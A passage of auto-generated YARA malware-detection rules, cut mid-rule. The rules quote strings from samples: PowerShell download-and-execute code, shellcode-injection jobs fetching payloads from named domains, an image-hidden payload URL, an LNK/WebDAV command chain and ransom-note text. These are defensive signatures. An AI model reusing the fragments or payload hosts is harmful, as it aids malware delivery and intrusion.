      $s5 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%AfNYJSdd%%ltmjRknq%%MPPWiwbz%%OLIsRSDf% %sdqZxwXd% %LdpHInNi%%gfsnVBmS%%wpspSvzN% %Mu" ascii /* score: '18.00'*/
      $s6 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%rxuTBOmc%%HybCcosk% %sdqZxwXd% %RpByHLqb%%wpspSvzN% %MuzppFgM%%temp%%AYFgQo" ascii /* score: '18.00'*/
      $s7 = "xdKK% %diNFTRfH% %appdata%%HiVNQtHS%%awCTWhLU%%vzzLTeQm%%LnHQjjkn%%TsWHptVE%%TgfqcbxU%%twauNYzy%" fullword ascii /* score: '18.00'*/
      $s8 = "%sdqZxwXd% %RpByHLqb%%wpspSvzN% %appdata%%QcUSmMXT%%BtXbxdlC%%lLXXlive%%rTSsZVfK%%MbJRvvgh%%XAsJmGpQ% %xqQdzOiS%%QwMoNKst% %uyMs" ascii /* score: '18.00'*/
      $s9 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dAntIrqL%%HybCcosk% %sdqZxwXd% %LdpHInNi%%oYsjuewr% %MuzppFgM%%temp%%MokQwW" ascii /* score: '18.00'*/
      $s10 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%rxuTBOmc%%HybCcosk% %sdqZxwXd% %LdpHInNi%%oYsjuewr% %MuzppFgM%%temp%%tdFkVg" ascii /* score: '18.00'*/
      $s11 = "%sdqZxwXd% %RpByHLqb%%wpspSvzN% %appdata%%QcUSmMXT%%BtXbxdlC%%lLXXlive%%rTSsZVfK%%MbJRvvgh%%XAsJmGpQ% %xqQdzOiS%%QwMoNKst% %uyMs" ascii /* score: '18.00'*/
      $s12 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%rxuTBOmc%%HybCcosk% %sdqZxwXd% %RpByHLqb%%wpspSvzN% %MuzppFgM%%temp%%AYFgQo" ascii /* score: '18.00'*/
      $s13 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dLYOHFAc%%JbDzTdOk%%MuzppFgM% %sdqZxwXd% %RpByHLqb%%wpspSvzN% %MuzppFgM%%te" ascii /* score: '18.00'*/
      $s14 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dAntIrqL%%HybCcosk% %sdqZxwXd% %LdpHInNi%%gfsnVBmS%%wpspSvzN% %MuzppFgM%%te" ascii /* score: '18.00'*/
      $s15 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%UQLDkhNg%%JbDzTdOk%%MuzppFgM% %sdqZxwXd% %ObbPWxrc%%nnaqyDMS% %MuzppFgM%%te" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_704e7c8d227565316132a8c86c3f2602e114809e621a633f72c171c8b96c142f_704e7c8d {
   meta:
      description = "_subset_batch - file 704e7c8d227565316132a8c86c3f2602e114809e621a633f72c171c8b96c142f_704e7c8d.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "704e7c8d227565316132a8c86c3f2602e114809e621a633f72c171c8b96c142f"
   strings:
      $s1 = "start /min https://www.youtube.com/watch?v=BNvoM0T8tXs" fullword ascii /* score: '21.00'*/
      $s2 = "ping -n 44 127.0.0.1 > nul" fullword ascii /* score: '20.00'*/
      $s3 = "echo 4/30/00 > YOU.txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 1KB and
      all of them
}

rule sig_29bafab62cffbf6ea661df4a767941c3128e252a61b7940ed9e28fb3aacbe4a6_29bafab6 {
   meta:
      description = "_subset_batch - file 29bafab62cffbf6ea661df4a767941c3128e252a61b7940ed9e28fb3aacbe4a6_29bafab6.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "29bafab62cffbf6ea661df4a767941c3128e252a61b7940ed9e28fb3aacbe4a6"
   strings:
      $s1 = "# Main download and execution logic" fullword ascii /* score: '27.00'*/
      $s2 = "# Naturvaerdierne: Execution function (Invoke-Expression wrapper)" fullword ascii /* score: '24.00'*/
      $s3 = "# === PHASE 6: DOWNLOAD AND EXECUTION LOOP ===" fullword ascii /* score: '22.00'*/
      $s4 = "        # Execute downloaded payload" fullword ascii /* score: '21.00'*/
      $s5 = "# Set User-Agent header" fullword ascii /* score: '21.00'*/
      $s6 = "# User-Agent string construction" fullword ascii /* score: '21.00'*/
      $s7 = "$Kontinentalsoklens.Headers.Add(\"user-agent\", $Beluringernes119)" fullword ascii /* score: '20.00'*/
      $s8 = "# === PHASE 7: PAYLOAD SIZES ===" fullword ascii /* score: '17.00'*/
      $s9 = "$Yokes191 = (gcm $Pariahdom).CommandType" fullword ascii /* score: '16.00'*/
      $s10 = "$Kontinentalsoklens.Headers.Add(\"Connection\", \"keep-alive\")" fullword ascii /* score: '15.00'*/
      $s11 = "        # Continue attempting download" fullword ascii /* score: '14.00'*/
      $s12 = "$global:Kontinentalsoklens = New-Object System.Net.WebClient" fullword ascii /* score: '14.00'*/
      $s13 = "# Modulsystemernes: Decoder function (co-5th character from position 4)" fullword ascii /* score: '13.00'*/
      $s14 = "# Set additional headers" fullword ascii /* score: '13.00'*/
      $s15 = "$Bisamokses = 361537  # Expected payload size" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 10KB and
      8 of them
}

rule sig_4098abbc7f9dfb452aaeabbc8bfefaa341147931f6a64783c87ecb442d778dbc_4098abbc {
   meta:
      description = "_subset_batch - file 4098abbc7f9dfb452aaeabbc8bfefaa341147931f6a64783c87ecb442d778dbc_4098abbc.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4098abbc7f9dfb452aaeabbc8bfefaa341147931f6a64783c87ecb442d778dbc"
   strings:
      $x1 = "for each_process in ComObjGet(\"winmgmts:\").ExecQuery(\"Select * from Win32_Process where Name = 'telegram.exe'\") {" fullword ascii /* score: '51.00'*/
      $x2 = "jobs.Push({ target: \"C:\\\\Windows\\\\System32\\\\rundll32.exe\", url: \"http://oneihmdo.com/91.bin\", done: false })" fullword ascii /* score: '49.00'*/
      $x3 = "jobs.Push({ target: \"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\", url: \"http://dmoneii.com/\", realUrlBase64: \"aHR0cD" ascii /* score: '44.00'*/
      $x4 = "jobs.Push({ target: \"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\", url: \"http://dmoneii.com/\", realUrlBase64: \"aHR0cD" ascii /* score: '44.00'*/
      $x5 = "jobs.Push({ target: \"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\", url: \"http://dmoneii.com/\", realUrlBase64: \"aHR0cD" ascii /* score: '44.00'*/
      $x6 = "jobs.Push({ target: \"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\", url: \"http://dmoneii.com/\", realUrlBase64: \"aHR0cD" ascii /* score: '44.00'*/
      $s7 = "    telegramPath := each_process.ExecutablePath" fullword ascii /* score: '23.00'*/
      $s8 = "InjectShellcode(job) {" fullword ascii /* score: '23.00'*/
      $s9 = "    if (InjectShellcode(job))" fullword ascii /* score: '18.00'*/
      $s10 = "        hProcess := NumGet(pi, 0, \"Ptr\")" fullword ascii /* score: '15.00'*/
      $s11 = "ProcessSetPriority(\"High\")" fullword ascii /* score: '15.00'*/
      $s12 = "SetTimer(() => TryInject(3), 1000) " fullword ascii /* score: '14.00'*/
      $s13 = "TryInject(taskIndex) {" fullword ascii /* score: '14.00'*/
      $s14 = "SetTimer(() => TryInject(2), 1000)" fullword ascii /* score: '14.00'*/
      $s15 = "SetTimer(() => TryInject(1), 1000)" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x4e23 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule sig_2ab2c40e6ba8ea76eb3aa7ce195edac268b7c882fe5ea874657777abb554ca69_2ab2c40e {
   meta:
      description = "_subset_batch - file 2ab2c40e6ba8ea76eb3aa7ce195edac268b7c882fe5ea874657777abb554ca69_2ab2c40e.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2ab2c40e6ba8ea76eb3aa7ce195edac268b7c882fe5ea874657777abb554ca69"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "Quotation For Inquiries.exe" fullword ascii /* score: '19.00'*/
      $s3 = "msedge_elf.dllPK" fullword ascii /* score: '13.00'*/
      $s4 = "zVZI.fZH" fullword ascii /* score: '10.00'*/
      $s5 = "[|2=6=.=*" fullword ascii /* score: '9.00'*/ /* hex encoded string '&' */
      $s6 = "* V\"ng" fullword ascii /* score: '9.00'*/
      $s7 = "?7 7(78747,7\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wxtw' */
      $s8 = "mfnnnaaa" fullword ascii /* score: '8.00'*/
      $s9 = "w%jmTj%q[l" fullword ascii /* score: '8.00'*/
      $s10 = "gudueug" fullword ascii /* score: '8.00'*/
      $s11 = "yrmbpgr" fullword ascii /* score: '8.00'*/
      $s12 = "gvdvevg" fullword ascii /* score: '8.00'*/
      $s13 = "kzhzjzizk" fullword ascii /* score: '8.00'*/
      $s14 = "Quotation For Inquiries.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      8 of them
}

rule sig_6906523f6f6a043f3abcaeb6aff77d32d6e9b175745f8301036645a398c68060_6906523f {
   meta:
      description = "_subset_batch - file 6906523f6f6a043f3abcaeb6aff77d32d6e9b175745f8301036645a398c68060_6906523f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6906523f6f6a043f3abcaeb6aff77d32d6e9b175745f8301036645a398c68060"
   strings:
      $s1 = "        var chadurs = globulet.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        var emboss = globulet.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        this[\"flambergs\"] = this[\"exodontia\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "8g('\" + this[\"islanded\"] + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule sig_2bd0a8a6a3bf7a0743750b90b3b594d9929b705ae6b51a792305ae0b1c627300_2bd0a8a6 {
   meta:
      description = "_subset_batch - file 2bd0a8a6a3bf7a0743750b90b3b594d9929b705ae6b51a792305ae0b1c627300_2bd0a8a6.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2bd0a8a6a3bf7a0743750b90b3b594d9929b705ae6b51a792305ae0b1c627300"
   strings:
      $s1 = "$if=[System.IO.File];$ifr=$if::ReadAllBytes;$ifw=$if::WriteAllBytes;$e=[System.Text.Encoding]::UTF8;$c=[System.Convert];$egb=$e." ascii /* score: '20.00'*/
      $s2 = "GetBytes;$egs=$e.GetString;$cf=$c::FromBase64String;$ct=$c::ToBase64String;$u='https://bitbucket.org/sippuwauquixe-2002/sippuwau" ascii /* score: '19.00'*/
      $s3 = "JBY3Rpb24gSWdub3JlOwokaW1hZ2VfYnl0ZXM9JGlmci5JbnZva2UoJHBfZmlzdCk7JHBfYnl0ZXM9JGltYWdlX2J5dGVzWzg1MTQ1Ny4uKCRpbWFnZV9ieXRlcy5MZW" ascii /* score: '11.00'*/
      $s4 = "quixe-2002/raw/da4fa03dc535124a5c49b2ccd54db5f75cdde746/pexels-abdelilah-hibat-allah.jpg';$egs.Invoke($cf.Invoke('JHBfZmlzdD0tam" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 2KB and
      all of them
}

rule sig_2dcb8477882c931e9b0d09560be451693ca19f4c5c9d34164578c21c1b2898bd_2dcb8477 {
   meta:
      description = "_subset_batch - file 2dcb8477882c931e9b0d09560be451693ca19f4c5c9d34164578c21c1b2898bd_2dcb8477.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2dcb8477882c931e9b0d09560be451693ca19f4c5c9d34164578c21c1b2898bd"
   strings:
      $s1 = "$if=[System.IO.File];$ifr=$if::ReadAllBytes;$ifw=$if::WriteAllBytes;$e=[System.Text.Encoding]::UTF8;$c=[System.Convert];$egb=$e." ascii /* score: '20.00'*/
      $s2 = "GetBytes;$egs=$e.GetString;$cf=$c::FromBase64String;$ct=$c::ToBase64String;$u='https://bitbucket.org/sippuwauquixe-2002/sippuwau" ascii /* score: '19.00'*/
      $s3 = "Rpb24gSWdub3JlOwokaW1hZ2VfYnl0ZXM9JGlmci5JbnZva2UoJHBfZmlzdCk7JHBfYnl0ZXM9JGltYWdlX2J5dGVzWzg5NDI5Ny4uKCRpbWFnZV9ieXRlcy5MZW5ndG" ascii /* score: '11.00'*/
      $s4 = "quixe-2002/raw/fe477aa623beb7fffefbf513e883e43ec5336e97/pexels-zlfdmr23-33793785.jpg';$egs.Invoke($cf.Invoke('JHBfZmlzdD0tam9pbi" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6924 and filesize < 2KB and
      all of them
}

rule sig_2e9fbb758403987b6e5b83409e7525dabeedc8eab304b149ad9ba02e073acf07_2e9fbb75 {
   meta:
      description = "_subset_batch - file 2e9fbb758403987b6e5b83409e7525dabeedc8eab304b149ad9ba02e073acf07_2e9fbb75.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2e9fbb758403987b6e5b83409e7525dabeedc8eab304b149ad9ba02e073acf07"
   strings:
      $s1 = "?]2D\\\"(" fullword ascii /* score: '9.00'*/ /* hex encoded string '-' */
      $s2 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
      $s3 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s4 = "+ -W=]" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule sig_60bd616440199c8b176b4de4b52f1971bb6610c0120325f8ce008228425a59a1_60bd6164 {
   meta:
      description = "_subset_batch - file 60bd616440199c8b176b4de4b52f1971bb6610c0120325f8ce008228425a59a1_60bd6164.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "60bd616440199c8b176b4de4b52f1971bb6610c0120325f8ce008228425a59a1"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule sig_71d40149901398f8afc563db7d2203efeeacd2618dcc57bdd3086728d5243405_71d40149 {
   meta:
      description = "_subset_batch - file 71d40149901398f8afc563db7d2203efeeacd2618dcc57bdd3086728d5243405_71d40149.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "71d40149901398f8afc563db7d2203efeeacd2618dcc57bdd3086728d5243405"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule sig_80459bd66b4c147528ab0ebc33c229051a7ab6eb96ccfea1bf9d94d33d3b5726_80459bd6 {
   meta:
      description = "_subset_batch - file 80459bd66b4c147528ab0ebc33c229051a7ab6eb96ccfea1bf9d94d33d3b5726_80459bd6.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "80459bd66b4c147528ab0ebc33c229051a7ab6eb96ccfea1bf9d94d33d3b5726"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule sig_50f13aadf1bc93b048fd518a99211f9af8ecb6fff70f96b3e45bb4ad44557a4d_50f13aad {
   meta:
      description = "_subset_batch - file 50f13aadf1bc93b048fd518a99211f9af8ecb6fff70f96b3e45bb4ad44557a4d_50f13aad.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "50f13aadf1bc93b048fd518a99211f9af8ecb6fff70f96b3e45bb4ad44557a4d"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 200KB and
      all of them
}

rule sig_2eabe9054cad5152567f0699947a2c5b_imphash_ {
   meta:
      description = "_subset_batch - file 2eabe9054cad5152567f0699947a2c5b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "25d46c839d0d3daa88d39ea71881fc3bee58e735ba0a14d6a896ed7cee5d656a"
   strings:
      $x1 = "</assembly><?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" man" ascii /* score: '50.00'*/
      $x2 = "sion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/>" ascii /* score: '31.00'*/
      $s3 = "Privileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compat" ascii /* score: '26.00'*/
      $s4 = "regview.exe" fullword wide /* score: '22.00'*/
      $s5 = "on>Nullsoft Install System v9.31.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><request" ascii /* score: '13.00'*/
      $s6 = "   <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCodePage>" fullword ascii /* score: '12.00'*/
      $s7 = " <assemblyIdentity type=\"win32\" name=\"VBoxNetNAT.exe\" version=\"7.0.20.13906\"></assemblyIdentity>" fullword ascii /* score: '10.00'*/
      $s8 = "* \".9Z " fullword ascii /* score: '9.00'*/
      $s9 = "* 0%u)" fullword ascii /* score: '9.00'*/
      $s10 = "jzksslqh" fullword ascii /* score: '8.00'*/
      $s11 = "mrlwybul" fullword ascii /* score: '8.00'*/
      $s12 = "regview" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule sig_2eabe9054cad5152567f0699947a2c5b_imphash__084649f2 {
   meta:
      description = "_subset_batch - file 2eabe9054cad5152567f0699947a2c5b(imphash)_084649f2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084649f2f86fdcbb591e6559b31fe81bcf5dd752578e0db935a20bf089b5b69a"
   strings:
      $s1 = "F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654" ascii /* score: '8.00'*/
      $s2 = "D836D843G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743G743" ascii /* score: '8.00'*/
      $s3 = "E925E925E925E925E926D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836D836" ascii /* score: '8.00'*/
      $s4 = "gqcyrqix" fullword ascii /* score: '8.00'*/
      $s5 = "esglwtuj" fullword ascii /* score: '8.00'*/
      $s6 = "G743G754F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654F654" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule sig_303cef75bfce4289c7888dae0bd4ff7772c422c6d4f43b054d2c36da717e3b90_303cef75 {
   meta:
      description = "_subset_batch - file 303cef75bfce4289c7888dae0bd4ff7772c422c6d4f43b054d2c36da717e3b90_303cef75.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "303cef75bfce4289c7888dae0bd4ff7772c422c6d4f43b054d2c36da717e3b90"
   strings:
      $s1 = "7266793B3B" ascii /* score: '17.00'*/ /* hex encoded string 'rfy;;' */
      $s2 = "696F6E206F" ascii /* score: '17.00'*/ /* hex encoded string 'ion o' */
      $s3 = "2D73776973732E636F6D2F622F" ascii /* score: '17.00'*/ /* hex encoded string '-swiss.com/b/' */
      $s4 = "696F6E2067" ascii /* score: '17.00'*/ /* hex encoded string 'ion g' */
      $s5 = "61202B2027" ascii /* score: '17.00'*/ /* hex encoded string 'a + '' */
      $s6 = "737976736769" ascii /* score: '17.00'*/ /* hex encoded string 'syvsgi' */
      $s7 = "LrHYaUlryepUqEdJnVIRhkHeudkiptOJsKUMhtItrTEdsRZIQivqFSQakddxkCBFPgcfjQbtNOZOgdlcDbSHxYEZtubEPLJpRyNMptYzGBcqtBtGsBtIjtIrcCmpoXeC" ascii /* score: '12.00'*/
      $s8 = "iVdEcgJHSCjRUmsFhPbPmUPzqZeYcfFbYZTZtfzFWsaOXHAVJhgRjzYOFdNCCkfmwIsuSTMCQVtttBbiZJOvznrZBFTPRxDlNnSPOFDqUdBOGeUEBfdtWjnIQTtNzxlS" ascii /* score: '9.00'*/
      $s9 = "raHProbGSWypmxbudrZHSoDWNoEewrxGbKPlgDIorYxUukaJFAMeTzaDXkCDkxJbZrOcipOaikPtribcNuZweTnbjLOvBFEuPWvDWybPmmvikhMoIZqpYNwGDmsWbSYd" ascii /* score: '9.00'*/
      $s10 = "wbxvXJDAGcFXjCxjFVavfuRtTlhFzgdZZJtDBvCFYDwsBCpIgQCuwjkCKDclbyBZzfyZJtiKSVXbyYsRwYYieidpZrtxSRdZCWtVEQznircbLIElL" fullword ascii /* score: '9.00'*/
      $s11 = "zctPPaMkTHMYswSeOuOwzCLsoQWmxAiUrhmdXnIYgoqqtFVWIRpdMFMxQAbyDanSYrhKKpGamqPLLVzjvAdfLFIlVoMWMJVGAYSBXKLTKOqWpAlvBsDCwHGTjwpVdkOc" ascii /* score: '9.00'*/
      $s12 = "syTrhjbOeZlSfbmVeCXwtmKkuhwjziiNgZjTBnbLTOPhkYcKGaHzDllFojwAmsOwqYlFsTTrbLceXdzWEmdYbiKvodeSqaZbzTqMmWSnGQYrIGiLjZwzPqVIOpROoBAB" ascii /* score: '9.00'*/
      $s13 = "iVdEcgJHSCjRUmsFhPbPmUPzqZeYcfFbYZTZtfzFWsaOXHAVJhgRjzYOFdNCCkfmwIsuSTMCQVtttBbiZJOvznrZBFTPRxDlNnSPOFDqUdBOGeUEBfdtWjnIQTtNzxlS" ascii /* score: '9.00'*/
      $s14 = "UJLnDyLkoKVxOlvUCRVTGSJtRyRbVpqazOCgpyrChTOmmIEyAUTLOvWBASVEgjOzUuyAjPfDZSmnEXGJtTbBWeLErAfXdnWxEOSrKEOloPmwIixdLLKNIMcpjuIijHam" ascii /* score: '9.00'*/
      $s15 = "pIWmQhwcHWXUMMZcMatVIrRWZIPJabHSzDnhElZydQNKXNWnpZGkfsPy" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x676b and filesize < 70KB and
      8 of them
}

rule sig_3052533550752fa7744576d45ef4c823f15d072d2682bd2f30c74ae8bcfe3e87_30525335 {
   meta:
      description = "_subset_batch - file 3052533550752fa7744576d45ef4c823f15d072d2682bd2f30c74ae8bcfe3e87_30525335.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3052533550752fa7744576d45ef4c823f15d072d2682bd2f30c74ae8bcfe3e87"
   strings:
      $s1 = "NetworkResolver.bat" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 200KB and
      all of them
}

rule sig_320c2dde1198ad47fb58c57072fd1f0de978b9debc982c51667dfc176c6b9947_320c2dde {
   meta:
      description = "_subset_batch - file 320c2dde1198ad47fb58c57072fd1f0de978b9debc982c51667dfc176c6b9947_320c2dde.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "320c2dde1198ad47fb58c57072fd1f0de978b9debc982c51667dfc176c6b9947"
   strings:
      $s1 = "C:\\Windows\\System32\\winrm.cmd" fullword ascii /* score: '26.00'*/
      $s2 = "%SystemRoot%\\system32\\winrm.cmd" fullword wide /* score: '24.00'*/
      $s3 = "winrm.cmd" fullword ascii /* score: '15.00'*/
      $s4 = "wps office#..\\..\\..\\Windows\\System32\\winrm.cmd_&s^t^art \\\\windows.system32.help@37\\webdav\\1.pdf&&call \\\\windows.syste" wide /* score: '13.00'*/
      $s5 = "*winrm.cmd" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 6KB and
      all of them
}

rule sig_32ead708c8b0e5fcc61c224fb7e9e1b75a88f287d4c5d2867faacec310385134_32ead708 {
   meta:
      description = "_subset_batch - file 32ead708c8b0e5fcc61c224fb7e9e1b75a88f287d4c5d2867faacec310385134_32ead708.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "32ead708c8b0e5fcc61c224fb7e9e1b75a88f287d4c5d2867faacec310385134"
   strings:
      $s1 = "Download Tor browser: https://www.torproject.org/download/" fullword ascii /* score: '16.00'*/
      $s2 = "4. Any attempt to restore systems, or refusal to negotiate, may lead to irreversible wipe of all data and your network." fullword ascii /* score: '14.00'*/
      $s3 = "Download Tox messenger: https://tox.chat/download.html" fullword ascii /* score: '13.00'*/
      $s4 = "TOX CONTACT - RECOVER YOUR FILES" fullword ascii /* score: '12.00'*/
      $s5 = "Check our blog: http://tezwsse5czllksjb7cwp65rvnk4oobmzti2znn42i43bjdfd2prqqkad.onion/ " fullword ascii /* score: '12.00'*/
      $s6 = "All your files are now encrypted and inaccessible." fullword ascii /* score: '9.00'*/
      $s7 = "COOPERATE TO PREVENT DATA LEAK (239 HOURS LEFT)" fullword ascii /* score: '9.00'*/
      $s8 = "   Brute-force, RAM dumps, third-party recovery tools are useless." fullword ascii /* score: '9.00'*/
      $s9 = "Any other means of communication are fake and may be set up by third parties. " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6134 and filesize < 4KB and
      all of them
}

rule sig_33cb3f74300fe592c430d1b75f380009631e1c3441416c9bb356eaff7e470bbf_33cb3f74 {
   meta:
      description = "_subset_batch - file 33cb3f74300fe592c430d1b75f380009631e1c3441416c9bb356eaff7e470bbf_33cb3f74.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "33cb3f74300fe592c430d1b75f380009631e1c3441416c9bb356eaff7e470bbf"
   strings:
      $s1 = "lrYFtPe" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x15f5 and filesize < 700KB and
      all of them
}

rule sig_77dac76c8c5859a2b9fc8ce19cf0e60b0a675a395f7a965e21f2de2360d016c7_77dac76c {
   meta:
      description = "_subset_batch - file 77dac76c8c5859a2b9fc8ce19cf0e60b0a675a395f7a965e21f2de2360d016c7_77dac76c.wsf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "77dac76c8c5859a2b9fc8ce19cf0e60b0a675a395f7a965e21f2de2360d016c7"
   strings:
      $s1 = "59325a6a63304e574d334e4463354e6a63324d544a6c4e6a49324d54633049696b4b43696367523256755a584a6864475567595342795957356b623230675a6d" ascii /* score: '24.00'*/ /* hex encoded string 'Y2Zjc0NWM3NDc5Njc2MTJlNjI2MTc0IikKCicgR2VuZXJhdGUgYSByYW5kb20gZm' */
      $s2 = "427a6143413949454e795a5746305a553969616d566a6443676956314e6a636d6c77644335546147567362434970436c4e6c6443426d6379413949454e795a57" ascii /* score: '24.00'*/ /* hex encoded string 'BzaCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpClNldCBmcyA9IENyZW' */
      $s3 = "417743676f67494341674a7942455a57786c644755676447686c49474a6864474e6f49475a706247554b4943416749475a7a4c6b526c624756305a555a706247" ascii /* score: '24.00'*/ /* hex encoded string 'AwCgogICAgJyBEZWxldGUgdGhlIGJhdGNoIGZpbGUKICAgIGZzLkRlbGV0ZUZpbG' */
      $s4 = "4e30636d6c755a7770476457356a64476c766269426b4d69686f4b516f6749455a7663694270494430674d5342556279424d5a57346f61436b675533526c6343" ascii /* score: '24.00'*/ /* hex encoded string 'N0cmluZwpGdW5jdGlvbiBkMihoKQogIEZvciBpID0gMSBUbyBMZW4oaCkgU3RlcC' */
      $s5 = "4167546d563464417046626d5167526e5675593352706232344b4369636751334a6c5958526c4947686c6248426c63694276596d706c5933527a436c4e6c6443" ascii /* score: '24.00'*/ /* hex encoded string 'AgTmV4dApFbmQgRnVuY3Rpb24KCicgQ3JlYXRlIGhlbHBlciBvYmplY3RzClNldC' */
      $s6 = "527662555a706247564f5957316c43676f6e49455a31626d4e306157397549475a7962323067646a4967644738675a47566a6232526c49474567614756344948" ascii /* score: '24.00'*/ /* hex encoded string 'RvbUZpbGVOYW1lCgonIEZ1bmN0aW9uIGZyb20gdjIgdG8gZGVjb2RlIGEgaGV4IH' */
      $s7 = "63675132686c59327367615759676447686c49484a6c625739305a53426d6157786c4947563461584e3063794268626d51675932397765534270644342736232" ascii /* score: '24.00'*/ /* hex encoded string 'cgQ2hlY2sgaWYgdGhlIHJlbW90ZSBmaWxlIGV4aXN0cyBhbmQgY29weSBpdCBsb2' */
      $s8 = "4179436941674943426b4d6941394947517949435967513268794b454e4d626d636f49695a494969416d494531705a43686f4c4342704c4341794b536b704369" ascii /* score: '24.00'*/ /* hex encoded string 'AyCiAgICBkMiA9IGQyICYgQ2hyKENMbmcoIiZIIiAmIE1pZChoLCBpLCAyKSkpCi' */
